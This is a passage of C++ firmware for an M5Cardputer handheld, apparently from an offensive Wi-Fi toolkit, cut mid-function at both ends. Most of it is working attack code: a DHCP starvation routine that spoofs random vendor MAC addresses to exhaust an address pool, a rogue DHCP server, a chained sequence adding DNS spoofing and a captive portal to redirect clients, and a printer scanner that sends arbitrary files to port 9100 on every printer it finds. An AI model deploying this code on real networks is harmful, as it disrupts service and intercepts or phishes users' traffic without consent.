            M5.Display.display();
            delay(1000);
            break;
        }

        generateRandomMAC(macBase, i); // Generate random MAC address
        completeDHCPTransaction(macBase); // Perform complete DHCP transaction

        float progress = (float)ackCount / totalIPs;
        percentage = (int)(progress * 100.0);
       // Update display with statistics
        M5.Display.fillRect(0, 40, M5.Display.width(), 40, menuBackgroundColor);
        M5.Display.setCursor(5, 40);
        M5.Display.printf("Pool percentage: %d%%\n", percentage);
        M5.Display.printf("Send Discover: %d\n", discoverCount);
        M5.Display.printf("Received Offer: %d\n", offerCount);
        M5.Display.printf("Send Request: %d\n", requestCount);
        M5.Display.printf("Received ACK: %d\n", ackCount);
        M5.Display.printf("Received NAK: %d\n", nakCount);
        M5.Display.print("Last IP:");
        M5.Display.print(lastAssignedIP.toString().c_str());
        M5.Display.print("        ");
        M5.Display.display();
        i++;
    }
    if (nakCount >= NAKNumberStarvation ){
            Serial.println(F("The number of NAK suggest a successfull Starvation."));
            M5.Display.clear(menuBackgroundColor);
            M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
            M5.Display.setCursor(5, 30);
            M5.Display.println("DHCP Starvation Stopped.\n\nThe number of NAK suggest\na successfull DHCP \nStarvation !!!");
            M5.Display.display();
            delay(4000);
    }
    Serial.println(F("DHCP Starvation attack completed."));
    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(5, 30);
    M5.Display.println("DHCP Starvation Stopped.");
    M5.Display.printf("Pool percentage: %d%%\n", percentage);
    M5.Display.printf("Total Discover: %d\n", discoverCount);
    M5.Display.printf("Total Offer: %d\n", offerCount);
    M5.Display.printf("Total Request: %d\n", requestCount);
    M5.Display.printf("Total ACK: %d\n", ackCount);
    M5.Display.printf("Total NAK: %d\n", nakCount);
    M5.Display.display();
    delay(4000);
    waitAndReturnToMenu("Return to menu");
}

static const uint8_t knownOUI[/*n*/][3] PROGMEM = {
    {0x00, 0x1A, 0x2B}, // Cisco
    {0x00, 0x1B, 0x63}, // Apple
    {0x00, 0x1C, 0x4D}, // Intel
    {0xAC, 0xDE, 0x48}, // Broadcom
    {0xD8, 0x3C, 0x69}, // Huawei
    {0x3C, 0xA0, 0x67}, // Samsung
    {0xB4, 0x86, 0x55}, // Xiaomi
    {0xF4, 0x28, 0x53}, // TP-Link
    {0x00, 0x25, 0x9C}, // Dell
    {0x00, 0x16, 0xEA}, // LG Electronics
    {0x00, 0x1E, 0xC2}, // Sony
    {0x50, 0xCC, 0xF8}, // Microsoft
    {0x00, 0x24, 0xE8}, // ASUS
    {0x88, 0x32, 0x9B}, // Hewlett Packard
    {0x00, 0x26, 0xBB}, // Lenovo
    {0x78, 0xD7, 0xF7}, // Realtek Semiconductor
    {0xBC, 0x92, 0x6B}, // Xiaomi Communications
    {0x84, 0xA8, 0xE4}, // OnePlus Technology
    {0xD4, 0x25, 0x8B}, // Oppo Mobile
    {0x8C, 0x5A, 0xF0}, // Amazon Technologies
    {0xAC, 0x3C, 0x0B}, // Google
    {0x00, 0x17, 0xF2}, // Philips Lighting
    {0x00, 0x1D, 0x7E}, // Motorola
    {0xF8, 0x16, 0x54}, // ZTE Corporation
    {0xE8, 0x94, 0xF6}, // Vivo Mobile
    {0xF4, 0x09, 0xD8}, // Netgear
    {0x00, 0x0F, 0xB5}, // Buffalo
    {0x40, 0x16, 0x7E}, // PlayStation
    {0x68, 0x5B, 0x35}, // Nintendo
    {0xF4, 0x6D, 0x04}, // Fitbit
    {0x00, 0x1E, 0x3D}, // Blackberry
    {0x24, 0xD4, 0x42}, // Razer
    {0x4C, 0x32, 0x75}, // Logitech
    {0x74, 0x83, 0xEF}, // Roku
    {0x28, 0xA1, 0x83}, // Alienware (Dell)
    {0xB8, 0x27, 0xEB}, // Raspberry Pi Foundation
    {0x44, 0x65, 0x0D}, // Aruba Networks
    {0x38, 0xFF, 0x36}, // Juniper Networks
    {0x00, 0x23, 0x6C}  // Panasonic
};

void generateRandomMAC(uint8_t *mac, uint16_t iteration) {
    // Select random OUI
    uint8_t index = random(0, sizeof(knownOUI) / sizeof(knownOUI[0]));
    mac[0] = knownOUI[index][0];
    mac[1] = knownOUI[index][1];
    mac[2] = knownOUI[index][2];

    // Generate last 3 bytes randomly
    mac[3] = random(0x00, 0xFF);
    mac[4] = random(0x00, 0xFF);
    mac[5] = random(0x00, 0xFF);
}

const char* fixedHostname = "Evil-Client";

void sendDHCPDiscover(uint8_t *mac) {
  // PrÃ©paration dâ€™un buffer local
  uint8_t dhcpDiscover[300] = {0};
  int index = 0;

  // Champ BOOTP de base
  dhcpDiscover[index++] = 0x01; // OP: BOOTREQUEST
  dhcpDiscover[index++] = 0x01; // HTYPE: Ethernet
  dhcpDiscover[index++] = 0x06; // HLEN: longueur MAC
  dhcpDiscover[index++] = 0x00; // HOPS

  // Transaction ID alÃ©atoire
  uint32_t xid = random(1, 0xFFFFFFFF); 
  dhcpDiscover[index++] = (xid >> 24) & 0xFF;
  dhcpDiscover[index++] = (xid >> 16) & 0xFF;
  dhcpDiscover[index++] = (xid >> 8)  & 0xFF;
  dhcpDiscover[index++] = (xid)       & 0xFF;

  // Seconds et flags
  dhcpDiscover[index++] = 0x00; 
  dhcpDiscover[index++] = 0x00;
  dhcpDiscover[index++] = 0x80; // Broadcast flag
  dhcpDiscover[index++] = 0x00;

  // ciaddr, yiaddr, siaddr, giaddr = 0
  for (int i = 0; i < 16; i++) {
    dhcpDiscover[index++] = 0x00;
  }

  // Client MAC
  for (int i = 0; i < 6; i++) {
    dhcpDiscover[index++] = mac[i];
  }
  // Remplir le champ chaddr sur 16 octets au total
  for (int i = 0; i < 10; i++) {
    dhcpDiscover[index++] = 0x00;
  }

  // sname (64 octets) + file (128 octets)
  for (int i = 0; i < 64; i++) {
    dhcpDiscover[index++] = 0x00;
  }
  for (int i = 0; i < 128; i++) {
    dhcpDiscover[index++] = 0x00;
  }

  // Magic cookie
  dhcpDiscover[index++] = 0x63;
  dhcpDiscover[index++] = 0x82;
  dhcpDiscover[index++] = 0x53;
  dhcpDiscover[index++] = 0x63;

  // Option 53: DHCP Discover
  dhcpDiscover[index++] = 53;
  dhcpDiscover[index++] = 1;
  dhcpDiscover[index++] = 1; // DHCP Discover

  // Option 61: Client Identifier (type 0x01 + MAC)
  dhcpDiscover[index++] = 61;
  dhcpDiscover[index++] = 7;    // 1 + 6 (hwtype + MAC)
  dhcpDiscover[index++] = 0x01; // hardware type Ethernet
  for (int i=0; i<6; i++) {
    dhcpDiscover[index++] = mac[i];
  }

  // Option 60: Vendor Class Identifier
  dhcpDiscover[index++] = 60;
  dhcpDiscover[index++] = strlen(vendorClass);
  for (size_t i = 0; i < strlen(vendorClass); i++) {
    dhcpDiscover[index++] = vendorClass[i];
  }

  // Option 12: Host Name
  dhcpDiscover[index++] = 12;
  dhcpDiscover[index++] = strlen(fixedHostname);
  for (size_t i = 0; i < strlen(fixedHostname); i++) {
    dhcpDiscover[index++] = fixedHostname[i];
  }

  // Option 55: Parameter Request List
  dhcpDiscover[index++] = 55; 
  dhcpDiscover[index++] = 4;  
  dhcpDiscover[index++] = 1;  // Subnet Mask
  dhcpDiscover[index++] = 3;  // Router
  dhcpDiscover[index++] = 6;  // DNS
  dhcpDiscover[index++] = 15; // Domain Name

  // End option
  dhcpDiscover[index++] = 255; 

  // Envoi du paquet
  if (udp.beginPacket(broadcastIP, 67)) {
    udp.write(dhcpDiscover, index);
    udp.endPacket();
    discoverCount++;
    Serial.println(F("Sent DHCP Discover with Host Name + Options..."));
  } else {
    Serial.println(F("Failed to send DHCP Discover."));
    M5.Display.setCursor(5, M5.Display.height() - 40);
    M5.Display.println("Failed to send DHCP Discover");
    M5.Display.display();
  }
}

void sendDHCPRequest(uint8_t *mac, IPAddress offeredIP, IPAddress dhcpServerIP) {
  uint8_t dhcpRequest[300] = {0};
  int index = 0;

  // BOOTP
  dhcpRequest[index++] = 0x01; // BOOTREQUEST
  dhcpRequest[index++] = 0x01; // Ethernet
  dhcpRequest[index++] = 0x06; // HLEN
  dhcpRequest[index++] = 0x00; // HOPS

  // Transaction ID
  uint32_t xid = random(1, 0xFFFFFFFF); 
  dhcpRequest[index++] = (xid >> 24) & 0xFF;
  dhcpRequest[index++] = (xid >> 16) & 0xFF;
  dhcpRequest[index++] = (xid >> 8)  & 0xFF;
  dhcpRequest[index++] =  xid        & 0xFF;

  // Seconds + Flags
  dhcpRequest[index++] = 0x00;
  dhcpRequest[index++] = 0x00;
  dhcpRequest[index++] = 0x80; // Broadcast
  dhcpRequest[index++] = 0x00;

  // ciaddr, yiaddr, siaddr, giaddr = 0
  for (int i = 0; i < 16; i++) {
    dhcpRequest[index++] = 0x00;
  }
  
  // Client MAC
  for (int i = 0; i < 6; i++) {
    dhcpRequest[index++] = mac[i];
  }
  for (int i = 0; i < 10; i++) {
    dhcpRequest[index++] = 0x00;
  }

  // sname + file
  for (int i = 0; i < 64; i++) {
    dhcpRequest[index++] = 0x00;
  }
  for (int i = 0; i < 128; i++) {
    dhcpRequest[index++] = 0x00;
  }

  // Magic cookie
  dhcpRequest[index++] = 0x63;
  dhcpRequest[index++] = 0x82;
  dhcpRequest[index++] = 0x53;
  dhcpRequest[index++] = 0x63;

  // Option 53: DHCP Request
  dhcpRequest[index++] = 53;
  dhcpRequest[index++] = 1;
  dhcpRequest[index++] = 3; // DHCP Request

  // Option 50: Requested IP
  dhcpRequest[index++] = 50;
  dhcpRequest[index++] = 4;
  dhcpRequest[index++] = offeredIP[0];
  dhcpRequest[index++] = offeredIP[1];
  dhcpRequest[index++] = offeredIP[2];
  dhcpRequest[index++] = offeredIP[3];

  // Option 54: Server Identifier
  dhcpRequest[index++] = 54;
  dhcpRequest[index++] = 4;
  dhcpRequest[index++] = dhcpServerIP[0];
  dhcpRequest[index++] = dhcpServerIP[1];
  dhcpRequest[index++] = dhcpServerIP[2];
  dhcpRequest[index++] = dhcpServerIP[3];

  // Option 61: Client Identifier
  dhcpRequest[index++] = 61;
  dhcpRequest[index++] = 7;   
  dhcpRequest[index++] = 0x01; // hardware type
  for (int i=0; i<6; i++) {
    dhcpRequest[index++] = mac[i];
  }

  // Option 60: Vendor Class
  dhcpRequest[index++] = 60;
  dhcpRequest[index++] = strlen(vendorClass);
  for (size_t i = 0; i < strlen(vendorClass); i++) {
    dhcpRequest[index++] = vendorClass[i];
  }

  // Option 12: Host Name
  dhcpRequest[index++] = 12;
  dhcpRequest[index++] = strlen(fixedHostname);
  for (size_t i = 0; i < strlen(fixedHostname); i++) {
    dhcpRequest[index++] = fixedHostname[i];
  }

  // End
  dhcpRequest[index++] = 255; 

  // Envoi
  if (udp.beginPacket(broadcastIP, 67)) {
    udp.write(dhcpRequest, index);
    udp.endPacket();
    requestCount++;
    Serial.println(F("Sent DHCP Request with Host Name + Options..."));
  } else {
    Serial.println(F("Failed to send DHCP Request."));
    M5.Display.setCursor(5, M5.Display.height() - 40);
    M5.Display.println("Failed to send DHCP Request");
    M5.Display.display();
  }
}

// Complete DHCP Transaction
void completeDHCPTransaction(uint8_t *mac) {
  // Envoie Discover
  sendDHCPDiscover(mac);
  Serial.println(F("DHCP Discover sent. Waiting for DHCP Offer..."));

  unsigned long offerWaitStart = millis();
  while (millis() - offerWaitStart < 3000) { // passÃ© de 2000 -> 3000ms
    int packetSize = udp.parsePacket();
    if (packetSize > 0) {
      uint8_t packetBuffer[DHCP_BUFFER_SIZE];
      int readLen = min(packetSize, (int)sizeof(packetBuffer));
      udp.read(packetBuffer, readLen); // Evite out-of-bounds

      uint8_t messageType = parseDHCPMessageType(packetBuffer, readLen);
      if (messageType == 6) { // DHCP NAK
        nakCount++;
        Serial.println(F("Received DHCP NAK"));
        return;
      } 
      else if (messageType == 2) { // DHCP Offer
        offerCount++;
        // yiaddr = offset 16..19
        IPAddress offeredIP(packetBuffer[16], packetBuffer[17], 
                            packetBuffer[18], packetBuffer[19]);
        Serial.printf("Offered IP: %s\n", offeredIP.toString().c_str());
        lastAssignedIP = offeredIP;

        // On envoie le Request
        sendDHCPRequest(mac, offeredIP, dhcpServerIP);

        // Attente ACK
        unsigned long ackWaitStart = millis();
        while (millis() - ackWaitStart < 3000) {
          int ackPacketSize = udp.parsePacket();
          if (ackPacketSize > 0) {
            int ackReadLen = min(ackPacketSize, (int)sizeof(packetBuffer));
            udp.read(packetBuffer, ackReadLen);

            uint8_t ackMessageType = parseDHCPMessageType(packetBuffer, ackReadLen);
            if (ackMessageType == 5) { // DHCP ACK
              ackCount++;
              Serial.printf("IP successfully assigned: %s\n", offeredIP.toString().c_str());
              return;
            } else if (ackMessageType == 6) { // DHCP NAK
              nakCount++;
              Serial.println(F("Received DHCP NAK"));
              return;
            }
          }
        }
        Serial.println(F("No DHCP ACK received."));
        return;
      }
    }
  }
  Serial.println(F("No DHCP Offer received."));
}

// DHCP packet analysis
uint8_t parseDHCPMessageType(uint8_t *packet, int packetSize) {
    if (packetSize < 244 || packet[236] != 0x63 || packet[237] != 0x82 || packet[238] != 0x53 || packet[239] != 0x63) {
        return 0; // Not a DHCP packet
    }
    for (int i = 240; i < packetSize; i++) {
        if (packet[i] == 53 && packet[i + 1] == 1) {
            return packet[i + 2];
        }
    }
    return 0;
}

/*
============================================================================================================================
// Switch DNS
============================================================================================================================
*/
void switchDNS() {
  ipAP = WiFi.softAPIP();
  ipSTA = WiFi.localIP();
  dnsServer.stop();  // Stop the current DNS server
  useAP = !useAP;    // Toggle between AP and STA modes
  IPAddress newIP = useAP ? ipAP : ipSTA;
  dnsServer.start(DNS_PORT, "*", newIP);  // Restart the DNS server with the new IP
  Serial.print(F("DNS restarted with IP: "));
  Serial.println(newIP);

  // Build the message with the current DNS IP
  String message = "DNS reset, new IP: " + newIP.toString();
  waitAndReturnToMenu(message.c_str());  // Pass the message as an argument
}


/*
============================================================================================================================
// Rogue DHCP
============================================================================================================================
*/
void rogueDHCPAuto() {
  rogueIPRogue = WiFi.localIP();
  currentSubnetRogue = WiFi.subnetMask();
  currentGatewayRogue = WiFi.localIP();
  currentDNSRogue = WiFi.localIP();

  udp.begin(localUdpPort);

  M5.Display.clear(menuBackgroundColor);
  Serial.println(F("Rogue DHCP running..."));
  updateDisplay("DHCP running...");

  unsigned long startTime = millis(); // Enregistrer le temps de dÃ©but

  while (millis() - startTime < 15000) { // Boucle pendant 15 secondes
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();

    int packetSizeRogue = udp.parsePacket();
    if (packetSizeRogue > 0 && packetSizeRogue <= 512) {
      Serial.printf("Received packet, size: %d bytes\n", packetSizeRogue);
      updateDisplay("Packet received");

      uint8_t packetBufferRogue[512];
      udp.read(packetBufferRogue, packetSizeRogue);

      uint8_t messageTypeRogue = getDHCPMessageType(packetBufferRogue, packetSizeRogue);
      uint8_t offeredIpSuffix = 0;
      
      if (messageTypeRogue == 1) { // DHCP Discover
        Serial.println(F("DHCP Discover received. Preparing Offer..."));
        updateDisplay("Discover. Preparing Offer...");
      
        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 2, offeredIpSuffix);
      
        // Send the DHCP Offer (broadcast)
        sendDHCPResponse(packetBufferRogue, packetSizeRogue, false, offeredIpSuffix);
        Serial.println(F("DHCP Offer sent."));
        updateDisplay("Offer sent.");
      
      } else if (messageTypeRogue == 3) { // DHCP Request
        Serial.println(F("DHCP Request received. Preparing ACK..."));
        updateDisplay("Request. Preparing ACK...");
      
        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 5, offeredIpSuffix);
      
        // Send the DHCP ACK (unicast vers client)
        sendDHCPResponse(packetBufferRogue, packetSizeRogue, true, offeredIpSuffix);
        Serial.println(F("DHCP ACK sent."));
        updateDisplay("ACK sent.");
      }

    }
  }
  updateDisplay("Rogue DHCP stopped.");
}


void DHCPAttackAuto(){
  bool DHCPDNSExplain = false;
  if (confirmPopup("Some explanation ?")){
    DHCPDNSExplain = true;
  }
  if (DHCPDNSExplain){
    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(5, 20);
    M5.Display.println("Step 1 : DHCP Starvation.");
    M5.Display.println("Send multiple fake new");
    M5.Display.println("client to saturate the");
    M5.Display.println("the pool of available");
    M5.Display.println("IP address that DHCP can"); 
    M5.Display.println("provide. NAK = Starvation");
    M5.Display.println("Press Enter to start");
    M5.Display.display();
    while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)){
      M5.update();
      M5Cardputer.update();
      delay(100);
    }
  }
  startDHCPStarvation();
  enterDebounce();
  if (DHCPDNSExplain){
      M5.Display.clear(menuBackgroundColor);
      M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
      M5.Display.setCursor(5, 20);
      M5.Display.println("Step 2 : Rogue DHCP.");
      M5.Display.println("The Original DHCP cant");
      M5.Display.println("provide new IP so we");
      M5.Display.println("now answering any DHCP");
      M5.Display.println("request with hijacked");
      M5.Display.println("DNS that at evil IP.");
      M5.Display.println("Press Enter to start");
      M5.Display.display();
    while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)){
      M5.update();
      M5Cardputer.update();
      delay(100);
    }
  }
  rogueDHCPAuto();
  enterDebounce();
  if (DHCPDNSExplain){
    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(5, 20);
    M5.Display.println("Step 3 : Start the Web");
    M5.Display.println("server with DNS Spoofing.");
    M5.Display.println("Start the portal to");
    M5.Display.println("provide page and DNS.");
    M5.Display.println("The DNS spoof any request");
    M5.Display.println("to redirect to the evil.");
    M5.Display.println("Press Enter to start");
    M5.Display.display();
    while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)){
      M5.update();
      M5Cardputer.update();
      delay(100);
    }
  }
  createCaptivePortal();
  enterDebounce();
  if (DHCPDNSExplain){
    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(5, 20);
    M5.Display.println("Step 4 : Change DNS IP.");
    M5.Display.println("Changing DNS IP with");
    M5.Display.println("local IP address to");
    M5.Display.println("provide Spoffed DNS query.");
    M5.Display.println("Press Enter to change");
    M5.Display.display();
    while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)){
      M5.update();
      M5Cardputer.update();
      delay(100);
    }
  }
  switchDNS();
}




/*
============================================================================================================================
// Printer
============================================================================================================================
*/

// Global vector for detected printers
std::vector<IPAddress> detectedPrinters;

// Checks if a host is a printer (port 9100 open)
bool isPrinter(IPAddress ip, uint32_t timeout_ms = 150) {
    WiFiClient client; // Instance of WiFiClient
    Serial.printf("[TEST] Checking IP: %s for printer on port 9100\n", ip.toString().c_str());

    if (connectWithTimeout(client, ip, 9100, timeout_ms)) {
        Serial.printf("[INFO] Printer detected at IP: %s\n", ip.toString().c_str());
        client.stop(); // Close the connection properly
        return true;
    } else {
        Serial.printf("[INFO] No printer found at IP: %s\n", ip.toString().c_str());
        return false;
    }
}

bool validateBaseIP(const String& baseIP) {
    int dotCount = 0;
    for (char c : baseIP) {
        if (c == '.') dotCount++;
        else if (!isDigit(c)) return false;
    }
    return dotCount == 2; // Ensures "192.168.1" contains only two dots
}

String getNetworkBase() {
    String baseIP = "";
    M5.Display.clear();
    M5.Display.setTextSize(1.5);
    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
    M5.Display.setCursor(5, 5);
    M5.Display.println("Enter base IP (192.168.1):");
    M5.Display.setCursor(5, 50);

    while (true) {
        baseIP = getUserInput(); // Reuses your `getUserInput` function

        // If the user enters "ok", use the current network IP
        if (baseIP == "ok") {
            IPAddress currentIP = WiFi.localIP();
            char fallbackIP[16];
            sprintf(fallbackIP, "%d.%d.%d", currentIP[0], currentIP[1], currentIP[2]);
            return String(fallbackIP);
        }

        // Validate partial IP address format
        if (validateBaseIP(baseIP)) {
            return baseIP;
        } else {
            M5.Display.setCursor(5, 80);
            M5.Display.println("Invalid format! Retry.");
            delay(2000);
            M5.Display.clear();
            M5.Display.setCursor(5, 5);
            M5.Display.println("Enter base IP (192.168.1):");
        }
    }
}

void detectPrinter() {
    if (WiFi.localIP().toString() == "0.0.0.0") {
        Serial.println(F("[INFO] Not connected to a network."));
        waitAndReturnToMenu("Not connected to a network.");
        return;
    }

    // Get the base network IP
    String baseIP = getNetworkBase();
    char base_ip[16];
    sprintf(base_ip, "%s.", baseIP.c_str());

    Serial.println("[INFO] Network base IP: " + String(base_ip));
    M5.Display.clear();
    M5.Display.setCursor(5, 20);
    M5.Display.println("Scanning for printers...");
    M5.Display.display();

    detectedPrinters.clear();

    // Scan subnet IP addresses
    for (int i = 1; i <= 254; i++) {
        IPAddress currentIP;
        sscanf(base_ip, "%d.%d.%d.", &currentIP[0], &currentIP[1], &currentIP[2]);
        currentIP[3] = i;

        Serial.printf("[DEBUG] Checking IP: %s\n", currentIP.toString().c_str());

        // Check directly for port 9100 with a 100ms timeout
        if (isPrinter(currentIP, 100)) {
            detectedPrinters.push_back(currentIP);
            Serial.printf("[INFO] Printer detected: %s\n", currentIP.toString().c_str());
        }

        // Progress update
        if (i % 10 == 0) {
            M5.Display.setCursor(5, 40);
            M5.Display.printf("Scanned %d/254 IPs...\n", i);
            M5.Display.display();
        }
    }

    // Final result
    M5.Display.clear();
    if (detectedPrinters.empty()) {
        M5.Display.setCursor(5, 20);
        M5.Display.println("No printers detected.");
        M5.Display.println("Returning to menu...");
        M5.Display.display();
        Serial.println(F("[INFO] No printers detected."));
    } else {
        M5.Display.setCursor(5, 20);
        M5.Display.println("Printers found:");
        for (const auto &printerIP : detectedPrinters) {
            Serial.println(" - " + printerIP.toString());
            M5.Display.println(printerIP.toString());
        }
        M5.Display.display();
    }

    delay(2000);
    waitAndReturnToMenu("return to menu");
}

void printFile() {
      if (WiFi.localIP().toString() == "0.0.0.0") {
        Serial.println(F("[INFO] Not connected to a network."));
        waitAndReturnToMenu("Not connected to a network.");
        return;
    }
    // File path to print and printer IP configuration
    String filePath = "/evil/Printer/File-To-Print.txt"; // Replace with your file
    String printerConfigPath = "/evil/Printer/PrinterIp.txt";

    std::vector<IPAddress> printerIPs;

    // Check for necessary files
    if (!SD.exists(filePath)) {
        M5.Display.clear();
        M5.Display.setCursor(5, 20);
        M5.Display.println("File not found:");
        M5.Display.println(filePath);
        waitAndReturnToMenu("return to menu");
        return;
    }

    if (!SD.exists(printerConfigPath)) {
        Serial.println(F("Printer configuration file not found."));
    }

    // Open printer configuration file
    File config = SD.open(printerConfigPath);
    if (config) {
        while (config.available()) {
            String line = config.readStringUntil('\n');
            line.trim(); // Removes whitespace and newlines
            if (line.length() > 0) {
                IPAddress ip;
                if (ip.fromString(line)) {
                    printerIPs.push_back(ip);
                } else {
                    Serial.printf("Invalid IP format in PrinterIp.txt: %s\n", line.c_str());
                }
            }
        }
        config.close();
    }

    // If the file is empty, use detected printers
    if (printerIPs.empty()) {
        printerIPs = detectedPrinters;
    }

    // Check if there are printers to process
    if (printerIPs.empty()) {
        M5.Display.clear();
        M5.Display.setCursor(5, 20);
        M5.Display.println("No printers detected");
        M5.Display.println("or configured.");
        M5.Display.println("Returning to menu...");
        M5.Display.display();
        delay(2000);
        waitAndReturnToMenu("return to menu");
        return;
    }

    // Confirm operation with the user
    String message = "Attack " + String(printerIPs.size()) + " printers?";
    if (!confirmPopup(message)) {
        M5.Display.clear();
        M5.Display.setCursor(5, 20);
        M5.Display.println("Operation cancelled by user.");
        M5.Display.display();
        delay(2000);
        waitAndReturnToMenu("return to menu");
        return;
    }

    // Open the file to print
    File file = SD.open(filePath);
    if (!file) {
        M5.Display.clear();
        M5.Display.setCursor(5, 20);
        M5.Display.println("Failed to open file:");
        M5.Display.println(filePath);
        M5.Display.println("Returning to menu...");
        M5.Display.display();
        delay(2000);
        waitAndReturnToMenu("return to menu");
        return;
    }

    // Send the file to each printer
    for (IPAddress printerIP : printerIPs) {
        WiFiClient client;

        // Connect to the printer on port 9100
        if (!client.connect(printerIP, 9100)) {
            Serial.printf("Failed to connect to printer: %s\n", printerIP.toString().c_str());
            continue;
        }

        // Display current status on the screen
        M5.Display.clear();
        M5.Display.setCursor(5, 20);
        M5.Display.println("Printing to:");
        M5.Display.println(printerIP.toString());
        M5.Display.display();
        delay(200);

        // Reset file position
        file.seek(0);

        // Read the file and send its content to the printer
        while (file.available()) {
            String line = file.readStringUntil('\n'); // Read line by line
            client.println(line);                     // Send to the printer
        }

        client.stop();
        Serial.printf("Print job completed for printer: %s\n", printerIP.toString().c_str());
    }

    file.close();

    // Confirm operation completion
    M5.Display.clear();
    M5.Display.setCursor(5, 20);
    M5.Display.println("Print job completed");
    M5.Display.println("on all printers!");
    M5.Display.display();
    delay(2000);
    waitAndReturnToMenu("return to menu");
}



// Define the SNMP community and port
#define SNMP_PORT 161
#define SNMP_COMMUNITY "public"

// Function to encode an OID into BER format
int encodeOID(const char* oidStr, uint8_t* outBuffer, size_t outSize) {
    std::vector<int> parts;
    char temp[64];
    strncpy(temp, oidStr, sizeof(temp) - 1);
    temp[sizeof(temp) - 1] = '\0';

    char* token = strtok(temp, ".");
    while (token) {
        parts.push_back(atoi(token));
        token = strtok(nullptr, ".");
    }

    if (parts.size() < 2) return -1; // Invalid OID

    int pos = 0;
    outBuffer[pos++] = (uint8_t)(parts[0] * 40 + parts[1]);

    for (size_t i = 2; i < parts.size(); i++) {
        int val = parts[i];
        if (val < 128) {
            outBuffer[pos++] = (uint8_t)val;
        } else {
            return -1; // Simplified: no multi-byte support
        }
        if (pos >= (int)outSize) return -1;
    }
    return pos;
}


bool parseSNMPResponse(const uint8_t* buffer, size_t bufferLen, String &outValue) {
    // Keep an index that moves through buffer
    size_t index = 0;

    // 1) Expect top-level SEQUENCE (0x30)
    if (buffer[index++] != 0x30) {
        Serial.println(F("[ERROR] Not a SEQUENCE at top-level."));
        return false;
    }
    // Read length
    uint8_t snmpMsgLength = buffer[index++];
    
    // 2) Read version INTEGER
    if (buffer[index++] != 0x02) {
        Serial.println(F("[ERROR] Expected version INTEGER tag."));
        return false;
    }
    uint8_t versionLength = buffer[index++];
    // Skip the version bytes
    index += versionLength;

    // 3) Read community OCTET STRING
    if (buffer[index++] != 0x04) {
        Serial.println(F("[ERROR] Expected community OCTET STRING tag."));
        return false;
    }
    uint8_t communityLength = buffer[index++];
    // Skip the community bytes
    index += communityLength;

    // 4) Read PDU type (0xA2 for Get-Response)
    uint8_t pduType = buffer[index++];
    if (pduType != 0xA2) {
        Serial.printf("[WARN] Unexpected PDU type: 0x%02X\n", pduType);
    }
    uint8_t pduLength = buffer[index++];

    // 5) Read request-id INTEGER
    if (buffer[index++] != 0x02) {
        Serial.println(F("[ERROR] Expected request-id INTEGER tag."));
        return false;
    }
    uint8_t ridLength = buffer[index++];
    index += ridLength; // skip request id bytes

    // 6) Read error-status INTEGER
    if (buffer[index++] != 0x02) {
        Serial.println(F("[ERROR] Expected error-status INTEGER tag."));
        return false;
    }
    uint8_t errStatusLen = buffer[index++];
    index += errStatusLen; // skip error status

    // 7) Read error-index INTEGER
    if (buffer[index++] != 0x02) {
        Serial.println(F("[ERROR] Expected error-index INTEGER tag."));
        return false;
    }
    uint8_t errIndexLen = buffer[index++];
    index += errIndexLen; // skip error index

    // 8) Read variable-bindings SEQUENCE
    if (buffer[index++] != 0x30) {
        Serial.println(F("[ERROR] Expected VarBind list SEQUENCE (0x30)."));
        return false;
    }
    uint8_t vbListLength = buffer[index++];

    // 9) Read first VarBind SEQUENCE
    if (buffer[index++] != 0x30) {
        Serial.println(F("[ERROR] Expected single VarBind SEQUENCE (0x30)."));
        return false;
    }
    uint8_t vbLength = buffer[index++];

    // 10) Read the OID
    if (buffer[index++] != 0x06) {
        Serial.println(F("[ERROR] Expected OID tag (0x06)."));
        return false;
    }
    uint8_t oidLength = buffer[index++];
    // skip the OID bytes
    index += oidLength;

    // 11) Now read the Value portion
    uint8_t valueTag = buffer[index++];
    uint8_t valueLen = buffer[index++];

    if (valueTag == 0x04) {
        // OCTET STRING
        // Copy out the next valueLen bytes as text
        char temp[128];
        if (valueLen >= sizeof(temp)) valueLen = sizeof(temp) - 1;
        memcpy(temp, &buffer[index], valueLen);
        temp[valueLen] = '\0';
        outValue = String(temp);
    }
    else if (valueTag == 0x02) {
        // INTEGER
        if (valueLen == 1) {
            int val = buffer[index]; 
            outValue = String(val);
        } else {
            // For simplicity, handle only 1-byte integers in this example
            outValue = F("[Unsupported multi-byte INTEGER]");
        }
    }
    else if (valueTag == 0x43) {
        // TIME TICKS
        // Usually 4 bytes, big-endian
        if (valueLen == 4) {
            uint32_t ticks = 
                (uint32_t)buffer[index] << 24 |
                (uint32_t)buffer[index+1] << 16 |
                (uint32_t)buffer[index+2] <<  8 |
                (uint32_t)buffer[index+3];
            // Convert ticks (1/100s) to some readable format
            // E.g., "1d 10:20:30" etc.
            outValue = String(ticks) + " (raw ticks)";
        } else {
            outValue = F("[Unsupported TIME TICKS length]");
        }
    }
    else {
        // For any other tag
        outValue = F("[Unhandled data type]");
    }

    // Advance index by valueLen
    index += valueLen;

    return true;
}


// Function to send an SNMP GET request
bool sendSNMPRequest(IPAddress printerIP, const char* oid, String& response) {
    uint8_t packet[100];
    int pos = 0;

    // SNMP header
    packet[pos++] = 0x30; // Sequence
    int lengthPos = pos++;

    // Version
    packet[pos++] = 0x02; // Integer
    packet[pos++] = 0x01;
    packet[pos++] = 0x00; // SNMP version 1

    // Community
    packet[pos++] = 0x04; // Octet string
    packet[pos++] = strlen(SNMP_COMMUNITY);
